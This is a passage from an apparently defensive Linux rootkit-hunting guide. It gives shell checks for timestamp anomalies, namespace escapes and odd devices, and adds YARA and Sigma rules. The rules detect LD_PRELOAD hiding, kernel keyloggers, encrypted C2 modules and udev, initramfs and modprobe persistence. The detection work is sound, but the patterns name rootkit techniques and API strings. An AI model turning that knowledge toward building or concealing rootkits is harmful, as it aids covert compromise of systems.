find / -newer /bin/ls -a ! -newer /bin/ls -maxdepth 3 2>/dev/null
# Files with EXACT same mtime as /bin/ls = suspicious

# -- 10. Container escape detection --
# From inside container: check neu namespace changed
ls -la /proc/1/ns/ 2>/dev/null
# Compare voi expected container namespace IDs
# Mismatch = namespace escape

# -- 11. /dev/kmem custom device detection --
ls -la /dev/ | grep -v "^[bcd]" | grep -v "^l"
# Unexpected character devices
cat /proc/devices | grep -i "misc"
# Check misc devices cho unexpected entries

# -- 12. YARA rules bo sung --
cat >> rootkit_detector.yar << 'YARA'

rule LD_Preload_Rootkit {
    meta:
        description = "Detect LD_PRELOAD-based userspace rootkit"
    strings:
        $s1 = "RTLD_NEXT" ascii
        $s2 = "readdir" ascii
        $s3 = "ld.so.preload" ascii
        $hide = "HIDDEN" ascii
    condition:
        uint32(0) == 0x464c457f and
        all of ($s*) and $hide
}

rule Kernel_Keylogger {
    meta:
        description = "Detect kernel keylogger module"
    strings:
        $s1 = "register_keyboard_notifier" ascii
        $s2 = "KBD_KEYSYM" ascii
        $s3 = "KEY_ENTER" ascii
        $log = "keylog" ascii nocase
    condition:
        uint32(0) == 0x464c457f and
        2 of ($s*) and $log
}

rule Encrypted_C2_Module {
    meta:
        description = "Detect kernel module with encrypted C2"
    strings:
        $s1 = "kernel_sendmsg" ascii
        $s2 = "kernel_recvmsg" ascii
        $s3 = "crypto_alloc_shash" ascii
        $s4 = "sock_create_kern" ascii
    condition:
        uint32(0) == 0x464c457f and
        3 of ($s*)
}
YARA

# -- 13. Sigma rule cho persistence methods --
cat > persistence_detect.yml << 'SIGMA'
title: Rootkit Persistence via Udev Rule
status: experimental
logsource:
    product: linux
    category: file_create
detection:
    selection:
        TargetFilename|endswith: '.rules'
        TargetFilename|contains: '/etc/udev/rules.d/'
    filter:
        Image|endswith:
            - '/apt'
            - '/dpkg'
            - '/rpm'
    condition: selection and not filter
level: high

---

title: Rootkit Persistence via Initramfs Modification
status: experimental
logsource:
    product: linux
    category: process_creation
detection:
    selection:
        CommandLine|contains:
            - 'update-initramfs'
            - 'dracut --force'
    filter:
        ParentImage|endswith:
            - '/apt'
            - '/dpkg'
            - '/yum'
            - '/dnf'
    condition: selection and not filter
level: high

---

title: Suspicious Module Auto-Load Configuration
status: experimental
logsource:
    product: linux
    category: file_create
detection:
    selection:
        TargetFilename|contains:
            - '/etc/modules-load.d/'
            - '/etc/modprobe.d/'
    filter:
        Image|endswith:
            - '/apt'
            - '/dpkg'
    condition: selection and not filter
level: medium
SIGMA
```
